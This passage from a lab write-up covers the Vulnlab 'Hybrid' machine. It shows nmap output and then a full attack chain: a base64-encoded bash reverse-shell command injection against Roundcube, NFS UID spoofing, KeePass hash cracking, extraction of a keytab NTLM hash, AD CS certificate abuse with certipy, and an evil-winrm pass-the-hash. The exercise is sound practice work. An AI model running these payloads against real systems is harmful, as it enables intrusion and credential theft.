DNS:dc01.hybrid.vl | Not valid before: 2024-07-17T16:39:23 |_Not valid after: 2025-07-17T16:39:23 |_ssl-date: TLS randomness does not represent time 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=dc01.hybrid.vl | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:dc01.hybrid.vl | Not valid before: 2024-07-17T16:39:23 |_Not valid after: 2025-07-17T16:39:23 |_ssl-date: TLS randomness does not represent time 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name) |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=dc01.hybrid.vl | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:dc01.hybrid.vl | Not valid before: 2024-07-17T16:39:23 |_Not valid after: 2025-07-17T16:39:23 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name) |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=dc01.hybrid.vl | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:dc01.hybrid.vl | Not valid before: 2024-07-17T16:39:23 |_Not valid after: 2025-07-17T16:39:23 3389/tcp open ms-wbt-server Microsoft Terminal Services |_ssl-date: 2024-07-30T07:53:55+00:00; -1s from scanner time. | ssl-cert: Subject: commonName=dc01.hybrid.vl | Not valid before: 2024-07-16T16:48:12 |_Not valid after: 2025-01-15T16:48:12 | rdp-ntlm-info: | Target_Name: HYBRID | NetBIOS_Domain_Name: HYBRID | NetBIOS_Computer_Name: DC01 | DNS_Domain_Name: hybrid.vl | DNS_Computer_Name: dc01.hybrid.vl | Product_Version: 10.0.20348 |_ System_Time: 2024-07-30T07:53:15+00:00 Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: -1s, deviation: 0s, median: -1s | smb2-security-mode: | 311: |_ Message signing enabled and required | smb2-time: | date: 2024-07-30T07:53:19 |_ start_date: N/A #Machine1\rPORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 60bc2226783cb4e06beaaa1ec1625dde (ECDSA) |_ 256 a3b5d86106e63a418845e35203d2231b (ED25519) 25/tcp open smtp Postfix smtpd |_smtp-commands: mail01.hybrid.vl, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, AUTH PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Redirecting... |_http-server-header: nginx/1.18.0 (Ubuntu) 110/tcp open pop3 Dovecot pop3d |_pop3-capabilities: TOP RESP-CODES STLS CAPA AUTH-RESP-CODE SASL PIPELINING UIDL |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=mail01 | Subject Alternative Name: DNS:mail01 | Not valid before: 2023-06-17T13:20:17 |_Not valid after: 2033-06-14T13:20:17 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind | 100003 3,4 2049/tcp nfs | 100003 3,4 2049/tcp6 nfs | 100005 1,2,3 33241/tcp6 mountd | 100005 1,2,3 35540/udp6 mountd | 100005 1,2,3 44973/tcp mountd | 100005 1,2,3 45099/udp mountd | 100021 1,3,4 33342/udp6 nlockmgr | 100021 1,3,4 39307/udp nlockmgr | 100021 1,3,4 39329/tcp6 nlockmgr | 100021 1,3,4 42997/tcp nlockmgr | 100024 1 39851/tcp6 status | 100024 1 49837/udp6 status | 100024 1 52577/tcp status | 100024 1 57571/udp status | 100227 3 2049/tcp nfs_acl |_ 100227 3 2049/tcp6 nfs_acl 143/tcp open imap Dovecot imapd (Ubuntu) |_imap-capabilities: Pre-login ENABLE capabilities LOGIN-REFERRALS have post-login IDLE listed more OK LITERAL+ IMAP4rev1 LOGINDISABLEDA0001 SASL-IR ID STARTTLS |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=mail01 | Subject Alternative Name: DNS:mail01 | Not valid before: 2023-06-17T13:20:17 |_Not valid after: 2033-06-14T13:20:17 587/tcp open smtp Postfix smtpd |_smtp-commands: mail01.hybrid.vl, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, AUTH PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING 993/tcp open ssl/imap Dovecot imapd (Ubuntu) |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=mail01 | Subject Alternative Name: DNS:mail01 | Not valid before: 2023-06-17T13:20:17 |_Not valid after: 2033-06-14T13:20:17 |_imap-capabilities: Pre-login ENABLE capabilities LOGIN-REFERRALS have post-login IDLE listed more OK LITERAL+ IMAP4rev1 AUTH=LOGINA0001 SASL-IR ID AUTH=PLAIN 995/tcp open ssl/pop3 Dovecot pop3d |_pop3-capabilities: TOP RESP-CODES USER CAPA AUTH-RESP-CODE SASL(PLAIN LOGIN) PIPELINING UIDL | ssl-cert: Subject: commonName=mail01 | Subject Alternative Name: DNS:mail01 | Not valid before: 2023-06-17T13:20:17 |_Not valid after: 2033-06-14T13:20:17 |_ssl-date: TLS randomness does not represent time 2049/tcp open nfs_acl 3 (RPC #100227) #Machine2\rShow mount : showmount -e $t2 Export list for 10.10.194.198: /opt/share *\rSet up : sudo apt install nfs-common Mount Share : sudo mount -t nfs $t2:/opt/share /mnt\rGot some credentials : admin@hybrid.vl:{plain}Duckling21 peter.turner@hybrid.vl:{plain}PeterIstToll!\rhttps://cyberthint.io/roundcube-markasjunk-command-injection-vulnerability/\nCommand injection : admin\u0026amp;echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjMuMTIvNDI0MiAwPiYxCg==${IFS}|base64${IFS}-d${IFS}|${IFS}bash\u0026amp;@hybrid.vl\rLook into NFS and upload a file luckily the id of the file correspond to the owner some we just need to create a user with the same id of the remote machine , copy bash and exec it . sudo useradd -u 902601108 username\rUser VL{a6d5a0504a2b24fe66761abc4c96013d}\nSo we got a password.kbx file : keepass2john passwords.kdbx | grep -o \u0026#34;$keepass$.*\u0026#34; \u0026gt; hash hashcat -a 0 -m 13400 /usr/share/wordlists/rockyou.txt hash\r- Got a password : `b0cwR+G4Dzl_rw` User VL{a6d5a0504a2b24fe66761abc4c96013d}\nnetexec smb 10.10.137.165 -u \u0026#34;peter.turner\u0026#34; -p \u0026#34;b0cwR+G4Dzl_rw\u0026#34; --shares netexec smb 10.10.137.165 -u \u0026#34;peter.turner\u0026#34; -p \u0026#34;b0cwR+G4Dzl_rw\u0026#34; -M spider_plus -o DOWNLOAD_FLAG=True~ netexec smb 10.10.137.165 -u \u0026#34;peter.turner\u0026#34; -p \u0026#34;b0cwR+G4Dzl_rw\u0026#34; --users\rUser:\nEdward.Miller Pamela.Smith Josh.Mitchell Peter.Turner Olivia.Smith Ricky.Myers Elliot.Watkins Emily.White Kathleen.Walker Margaret.shepherd\rcertipy find -u \u0026#39;peter.turner\u0026#39;@hybrid.vl -p \u0026#39;b0cwR+G4Dzl_rw\u0026#39; -dc-ip 10.10.137.165\rTool: https://github.com/sosdave/KeyTabExtract/blob/master/keytabextract.py As you can our linux machine is on AD with ldap so there is some cool file to grab : /etc/krb5.keytab\nThen we can extract ntlm hash from it : python3 keytabextract.py file.keytab [*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash. [*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction. [*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction. [+] Keytab File successfully imported. REALM : HYBRID.VL SERVICE PRINCIPAL : MAIL01$/ NTLM HASH : 0f916c5246fdbc7ba95dcef4126d57bd AES-256 HASH : eac6b4f4639b96af4f6fc2368570cde71e9841f2b3e3402350d3b6272e436d6e AES-128 HASH : 3a732454c95bcef529167b6bea476458\rcertipy req -username \u0026#39;MAIL01$\u0026#39;@hybrid.vl -hashes 0f916c5246fdbc7ba95dcef4126d57bd -target-ip \u0026#39;10.10.137.165\u0026#39; -ca \u0026#39;hybrid-DC01-CA\u0026#39; -template \u0026#39;HybridComputers\u0026#39; -upn \u0026#39;Administrator@hybrid.vl\u0026#39; -debug -key-size 4096 -dns hybrid.vl\rDon't forget to add DNS\ncertipy auth -pfx \u0026#39;administrator_hybrid.pfx\u0026#39; -username \u0026#39;administrator\u0026#39; -domain \u0026#39;hybrid.vl\u0026#39; -dc-ip 10.10.137.165\rCertipy v4.8.2 - by Oliver Lyak (ly4k) [*] Found multiple identifications in certificate [*] Please select one: [0] UPN: \u0026#39;Administrator@hybrid.vl\u0026#39; [1] DNS Host Name: \u0026#39;hybrid.vl\u0026#39; \u0026gt; 0 [*] Using principal: administrator@hybrid.vl [*] Trying to get TGT... [*] Got TGT [*] Saved credential cache to \u0026#39;administrator.ccache\u0026#39; [*] Trying to retrieve NT hash for \u0026#39;administrator\u0026#39; [*] Got hash for \u0026#39;administrator@hybrid.vl\u0026#39;: aad3b435b51404eeaad3b435b51404ee:60701e8543c9f6db1a2af3217386d3dc\revil-winrm -i 10.10.137.165 -u \u0026#34;Administrator\u0026#34; -H 60701e8543c9f6db1a2af3217386d3dc\rRoot VL{6b069f0bfac70efd8a17c2d1aa79f208}\n","date":"2023-09-07","id":55,"permalink":"/notes/lab/vulnlab/hybrid/","summary":"\u003cp\u003e#bypass_filter_with_base64\nScan :\u003c/p\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePORT     STATE SERVICE       VERSION\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e53/tcp   open  domain        Simple DNS Plus\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e88/tcp   open  kerberos-sec  Microsoft Windows Kerberos \u003cspan class=\"o\"\u003e(\u003c/span\u003eserver time: 2024-07-30 07:52:36Z\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e135/tcp  open  msrpc         Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e389/tcp  open  ldap          Microsoft Windows Active Directory LDAP \u003cspan class=\"o\"\u003e(\u003c/span\u003eDomain: hybrid.vl0., Site: Default-First-Site-Name\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003edc01.hybrid.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:dc01.hybrid.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2024-07-17T16:39:23\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2025-07-17T16:39:23\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ssl-date: TLS randomness does not represent \u003cspan class=\"nb\"\u003etime\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e445/tcp  open  microsoft-ds?\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e464/tcp  open  kpasswd5?\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP \u003cspan class=\"o\"\u003e(\u003c/span\u003eDomain: hybrid.vl0., Site: Default-First-Site-Name\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003edc01.hybrid.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:dc01.hybrid.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2024-07-17T16:39:23\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2025-07-17T16:39:23\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ssl-date: TLS randomness does not represent \u003cspan class=\"nb\"\u003etime\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3268/tcp open  ldap          Microsoft Windows Active Directory LDAP \u003cspan class=\"o\"\u003e(\u003c/span\u003eDomain: hybrid.vl0., Site: Default-First-Site-Name\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ssl-date: TLS randomness does not represent \u003cspan class=\"nb\"\u003etime\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003edc01.hybrid.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:dc01.hybrid.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2024-07-17T16:39:23\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2025-07-17T16:39:23\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP \u003cspan class=\"o\"\u003e(\u003c/span\u003eDomain: hybrid.vl0., Site: Default-First-Site-Name\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ssl-date: TLS randomness does not represent \u003cspan class=\"nb\"\u003etime\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003edc01.hybrid.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:dc01.hybrid.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2024-07-17T16:39:23\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2025-07-17T16:39:23\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3389/tcp open  ms-wbt-server Microsoft Terminal Services\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ssl-date: 2024-07-30T07:53:55+00:00\u003cspan class=\"p\"\u003e;\u003c/span\u003e -1s from scanner time.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003edc01.hybrid.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2024-07-16T16:48:12\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2025-01-15T16:48:12\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e rdp-ntlm-info:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   Target_Name: HYBRID\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   NetBIOS_Domain_Name: HYBRID\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   NetBIOS_Computer_Name: DC01\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   DNS_Domain_Name: hybrid.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   DNS_Computer_Name: dc01.hybrid.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   Product_Version: 10.0.20348\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_  System_Time: 2024-07-30T07:53:15+00:00\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eService Info: Host: DC01\u003cspan class=\"p\"\u003e;\u003c/span\u003e OS: Windows\u003cspan class=\"p\"\u003e;\u003c/span\u003e CPE: cpe:/o:microsoft:windows\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost script results:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_clock-skew: mean: -1s, deviation: 0s, median: -1s\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e smb2-security-mode:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   311:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_    Message signing enabled and required\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e smb2-time:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   date: 2024-07-30T07:53:19\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_  start_date: N/A\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#Machine1\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePORT     STATE SERVICE  VERSION\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 \u003cspan class=\"o\"\u003e(\u003c/span\u003eUbuntu Linux\u003cspan class=\"p\"\u003e;\u003c/span\u003e protocol 2.0\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssh-hostkey:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"m\"\u003e256\u003c/span\u003e 60bc2226783cb4e06beaaa1ec1625dde \u003cspan class=\"o\"\u003e(\u003c/span\u003eECDSA\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_  \u003cspan class=\"m\"\u003e256\u003c/span\u003e a3b5d86106e63a418845e35203d2231b \u003cspan class=\"o\"\u003e(\u003c/span\u003eED25519\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e25/tcp   open  smtp     Postfix smtpd\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_smtp-commands: mail01.hybrid.vl, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, AUTH PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e80/tcp   open  http     nginx 1.18.0 \u003cspan class=\"o\"\u003e(\u003c/span\u003eUbuntu\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_http-title: Redirecting...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_http-server-header: nginx/1.18.0 \u003cspan class=\"o\"\u003e(\u003c/span\u003eUbuntu\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e110/tcp  open  pop3     Dovecot pop3d\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_pop3-capabilities: TOP RESP-CODES STLS CAPA AUTH-RESP-CODE SASL PIPELINING UIDL\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ssl-date: TLS randomness does not represent \u003cspan class=\"nb\"\u003etime\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003email01\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Subject Alternative Name: DNS:mail01\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2023-06-17T13:20:17\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2033-06-14T13:20:17\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e111/tcp  open  rpcbind  2-4 \u003cspan class=\"o\"\u003e(\u003c/span\u003eRPC \u003cspan class=\"c1\"\u003e#100000)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e rpcinfo:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   program version    port/proto  service\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"m\"\u003e100000\u003c/span\u003e  2,3,4        111/tcp   rpcbind\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"m\"\u003e100000\u003c/span\u003e  2,3,4        111/udp   rpcbind\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"m\"\u003e100000\u003c/span\u003e  3,4          